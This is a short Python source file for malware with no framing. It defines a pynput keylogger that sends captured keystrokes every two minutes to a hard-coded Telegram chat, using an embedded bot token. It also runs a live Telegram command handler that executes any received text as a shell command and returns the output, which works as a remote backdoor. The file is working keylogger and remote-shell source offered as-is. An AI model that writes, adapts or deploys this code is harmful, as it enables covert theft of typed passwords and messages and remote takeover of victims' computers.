import pynput.keyboard
import threading
import telebot
import subprocess



bot = telebot.TeleBot('1765873937:AAFeXQe_em2JCX94lURI2ErRlHTtpFOg3nE')

class KeyLog:
	def __init__(self):
		self.log = ''

	def addToLog(self):
		self.log += newString

	def process_key_press(self, key):
		try:
			c_key = str(key.char)
		except AttributeError:
			if key == key.space:
				c_key = ' '
			else:
				c_key = ' ' + str(key) + ' '
		self.log += c_key
		#print(c_key)


	def sendReport(self):
		#print('changed log')
		#print(self.log)
		if self.log != '':
			bot.send_message(357225449, self.log)
		else:
			bot.send_message(357225449, 'User was inactive!')
		self.log = ''
		timer = threading.Timer(120, self.sendReport)
		timer.start()


	def printLog(self):
		print(self.log)

	def run(self):
		k_listener = pynput.keyboard.Listener(on_press=self.process_key_press)
		with k_listener:
			self.sendReport()
			k_listener.join()


#klogger = KeyLog()

#klogger.run()

def execute_system_command(command):
	return subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT,)

@bot.message_handler(content_types=["text"])
def getMessage(message):
	print(message.text)
	getResult = execute_system_command(message.text)
	print(getResult)
	if getResult != '' and getResult != None:
		bot.send_message(357225449, '{}'.format(getResult))

bot.polling() 




# def selfCall():
# 	print('report is here')
# 	timer = threading.Timer(1, selfCall)
# 	timer.start()

# selfCall()
# def process_key_press(key):
# 	try:
# 		c_key = str(key.char)
# 	except AttributeError:
# 		if key == key.space:
# 			c_key = ' '
# 		else:
# 			c_key = ' ' + str(key) + ' '
# 	print(c_key)


# k_listener = pynput.keyboard.Listener(on_press=process_key_press)
# with k_listener:
# 	k_listener.join()

